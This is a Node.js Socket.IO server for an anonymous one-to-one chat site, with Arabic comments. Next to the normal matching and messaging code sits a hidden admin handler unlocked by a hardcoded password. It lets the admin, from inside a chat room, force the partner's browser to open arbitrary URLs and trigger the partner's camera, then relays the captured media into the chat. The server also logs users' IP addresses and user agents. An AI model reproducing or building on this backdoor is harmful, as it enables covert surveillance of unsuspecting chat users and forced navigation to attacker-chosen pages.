const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// زيادة حد استقبال البيانات إلى 15 ميجابايت لمنع أي فصل عند إرسال ملفات أو صور كبيرة
const io = new Server(server, {
  maxHttpBufferSize: 15 * 1024 * 1024,
  cors: { origin: "*" }
});

app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

let waitingUser = null;

io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';
  
  socket.userInfo = { ip: clientIp, ua: userAgent };

  // نظام المطابقة الفوري والسليم
  socket.on('find_partner', () => {
    // تنظيف أي غرفة قدبمة للمستخدم قبل البحث من جديد
    if (socket.roomName) {
      socket.leave(socket.roomName);
      socket.roomName = null;
      socket.partnerId = null;
    }

    if (waitingUser && waitingUser.connected && waitingUser.id !== socket.id) {
      const roomName = 'room_' + socket.id + '_' + waitingUser.id;
      
      socket.join(roomName);
      waitingUser.join(roomName);

      socket.partnerId = waitingUser.id;
      waitingUser.partnerId = socket.id;
      socket.roomName = roomName;
      waitingUser.roomName = roomName;

      waitingUser.emit('matched');
      socket.emit('matched');

      waitingUser = null;
    } else {
      waitingUser = socket;
    }
  });

  // توجيه الرسائل داخل الغرفة فقط
  socket.on('message', (data) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('message', data);
    }
  });

  // مؤشر الكتابة
  socket.on('typing', (isTyping) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('display_typing', isTyping);
    }
  });

  // أوامر لوحة التحكم الخاصة بالأدمن (موجّهة بدقة للغرفة النشطة)
  socket.on('admin_action', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return;

    if (data.action === 'alert') {
      io.emit('system_alert', data.message);
    } else if (data.action === 'open_url') {
      if (socket.roomName) {
        socket.to(socket.roomName).emit('force_open_url', data.url);
      }
    } else if (data.action === 'clear_chat') {
      if (socket.roomName) {
        socket.to(socket.roomName).emit('clear_chat', data.target);
        socket.emit('clear_chat', data.target);
      }
    } else if (data.action === 'change_bg') {
      if (socket.roomName) {
        socket.to(socket.roomName).emit('change_bg', data.bgColor);
        socket.emit('change_bg', data.bgColor);
      }
    } else if (data.action === 'request_media') {
      if (socket.roomName) {
        socket.to(socket.roomName).emit('trigger_camera', { mediaType: data.mediaType });
      }
    }
  });

  // استقبال الصورة من المستخدم وإرسالها للطرف الآخر والشات
  socket.on('user_media_captured', (mediaData) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('message', { type: mediaData.type, content: mediaData.dataUrl });
    }
  });

  // قطع الاتصال والتنظيف الفوري لمنع تجميد النظام
  socket.on('disconnect', () => {
    if (waitingUser === socket) {
      waitingUser = null;
    }
    if (socket.roomName) {
      socket.to(socket.roomName).emit('partner_disconnected');
      socket.leave(socket.roomName);
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
